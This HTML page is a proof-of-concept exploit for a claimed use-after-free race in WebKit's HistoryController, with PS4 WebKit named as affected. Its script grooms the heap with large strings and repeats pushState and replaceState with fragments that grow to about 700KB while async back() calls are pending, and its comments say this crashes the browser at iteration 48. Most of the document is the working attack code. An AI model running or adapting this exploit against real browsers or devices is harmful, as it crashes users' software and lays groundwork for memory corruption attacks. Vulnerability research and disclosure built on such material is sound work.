<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>WebKit HistoryController Use-After-Free PoC</title>
</head>
<body>
<h1>WebKit HistoryController Use-After-Free</h1>
<button onclick="trigger()">Trigger Crash</button>
<pre id="log"></pre>

<script>
/*
 * WebKit HistoryController Use-After-Free
 * 
 * Affected: PS4 WebKit (and potentially other WebKit versions)
 * 
 * Description:
 * Race condition between History.replaceState() and asynchronous back()
 * operations causes use-after-free when handling large URL fragments.
 * 
 * Root Cause:
 * When multiple async back() operations are pending and replaceState()
 * modifies the current history entry with a large fragment (~695KB),
 * a pending back() operation accesses freed/invalid memory.
 * 
 * Trigger Conditions:
 * - 50 iterations of pushState + replaceState
 * - Fragment sizes growing from 977 to 709,566 bytes
 * - Async back() scheduled every 6 iterations
 * - Heap grooming (32KB per iteration)
 * - Crash occurs at iteration 48
 * 
 * Observed State (ITER 47):
 * - history.length: 32 (despite 48 pushStates)
 * - Current fragment: 666,184 bytes
 * - Heap accumulated: 1.6 MB
 * 
 * Impact:
 * Browser process crash (denial of service)
 */

const BASE = 977;
const STEP = 14461;
const ITERS = 50;

let heap = [];
let sharedState = { i: 0, p: "" };

function log(msg) {
  document.getElementById('log').textContent += msg + '\n';
  console.log(msg);
}

function trigger() {
  log('Triggering WebKit HistoryController UAF...');
  log('Expected crash at iteration 48\n');
  
  let size = BASE;
  
  const interval = setInterval(() => {
    const i = sharedState.i;
    
    if (i >= ITERS) {
      clearInterval(interval);
      log('\nUnexpected: Reached end without crash');
      return;
    }
    
    // Update shared state
    sharedState.i = i;
    sharedState.p = "A".repeat(size);
    
    // Heap grooming
    heap.push("G".repeat(32768));
    
    log(`[ITER ${i}] size=${size}, heap=${(heap.length * 32 / 1024).toFixed(1)}MB`);
    
    // Critical sequence: pushState + replaceState
    history.pushState(sharedState, "", "#" + sharedState.p);
    history.replaceState(sharedState, "", "#" + sharedState.p);
    
    // Schedule async back() every 6 iterations
    if (i % 6 === 0) {
      setTimeout(() => history.back(), 0);
      log(`  â†’ async back() scheduled`);
    }
    
    // Expected crash at ITER 48 (size=695105)
    if (i === 48) {
      log('\n!!! CRASH EXPECTED !!!');
    }
    
    size += STEP;
    sharedState.i++;
  }, 5);
}

log('WebKit HistoryController UAF PoC loaded');
log('Click "Trigger Crash" to reproduce\n');
log('Technical details:');
log('- BASE: 977 bytes');
log('- STEP: 14,461 bytes');
log('- Iterations: 50');
log('- Crash point: ITER 48 (fragment size 695,105 bytes)');
log('- Root cause: Race between replaceState and pending async back()');
</script>
</body>
</html>
